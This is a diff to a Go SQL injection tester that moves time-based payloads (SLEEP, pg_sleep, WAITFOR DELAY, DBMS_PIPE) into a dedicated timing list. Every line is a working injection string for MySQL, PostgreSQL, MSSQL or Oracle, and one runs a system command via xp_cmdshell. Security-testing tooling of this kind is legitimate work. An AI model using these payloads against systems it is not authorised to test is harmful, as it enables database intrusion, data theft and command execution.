@@ -161,9 +161,6 @@ func (t *Tester) generatePayloads() []Payload {
 		{"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "MySQL UPDATEXML error"},
 		{"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "MySQL group by error"},
 		{"' UNION SELECT @@version,NULL,NULL--", "MySQL version union"},
-		{"'; SELECT SLEEP(5)--", "MySQL stacked sleep"},
-		{"' AND IF(1=1,SLEEP(5),0)--", "MySQL conditional sleep"},
-		{"' AND BENCHMARK(5000000,MD5('test'))--", "MySQL benchmark delay"},
 	}
 
 	for _, p := range mysqlPayloads {
@@ -181,8 +178,6 @@ func (t *Tester) generatePayloads() []Payload {
 		desc  string
 	}{
 		{"' AND CAST((SELECT version()) AS int)--", "PostgreSQL version cast error"},
-		{"';SELECT pg_sleep(5)--", "PostgreSQL stacked sleep"},
-		{"' AND (SELECT pg_sleep(5))--", "PostgreSQL subquery sleep"},
 		{"' UNION SELECT version(),NULL,NULL--", "PostgreSQL version union"},
 		{"' AND 1=CAST((SELECT current_user) AS int)--", "PostgreSQL user extraction"},
 	}
@@ -202,8 +197,6 @@ func (t *Tester) generatePayloads() []Payload {
 		desc  string
 	}{
 		{"' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL version convert error"},
-		{"';WAITFOR DELAY '0:0:5'--", "MSSQL stacked waitfor"},
-		{"' AND IF 1=1 WAITFOR DELAY '0:0:5'--", "MSSQL conditional waitfor"},
 		{"' UNION SELECT @@version,NULL,NULL--", "MSSQL version union"},
 		{"'; EXEC xp_cmdshell('whoami')--", "MSSQL xp_cmdshell"},
 	}
@@ -224,7 +217,6 @@ func (t *Tester) generatePayloads() []Payload {
 	}{
 		{"' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))=1--", "Oracle context error"},
 		{"' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", "Oracle UTL_INADDR error"},
-		{"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", "Oracle pipe delay"},
 		{"' UNION SELECT banner,NULL,NULL FROM v$version--", "Oracle version union"},
 	}
 
@@ -273,6 +265,13 @@ func (t *Tester) generatePayloads() []Payload {
 		{"';WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL WAITFOR DELAY"},
 		{"' WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL WAITFOR"},
 		{"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", DBMSOracle, 5 * time.Second, "Oracle RECEIVE_MESSAGE"},
+		// Stacked/conditional variants moved from DBMS-specific error sections
+		{"'; SELECT SLEEP(5)--", DBMSMySQL, 5 * time.Second, "MySQL stacked SLEEP"},
+		{"' AND BENCHMARK(5000000,MD5('test'))--", DBMSMySQL, 5 * time.Second, "MySQL BENCHMARK delay"},
+		{"' AND (SELECT pg_sleep(5))--", DBMSPostgreSQL, 5 * time.Second, "PostgreSQL subquery pg_sleep"},
+		{"';WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL stacked WAITFOR"},
+		{"' AND IF 1=1 WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL conditional WAITFOR"},
+		{"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", DBMSOracle, 5 * time.Second, "Oracle DBMS_PIPE delay"},
 	}
 
 	for _, p := range timePayloads {
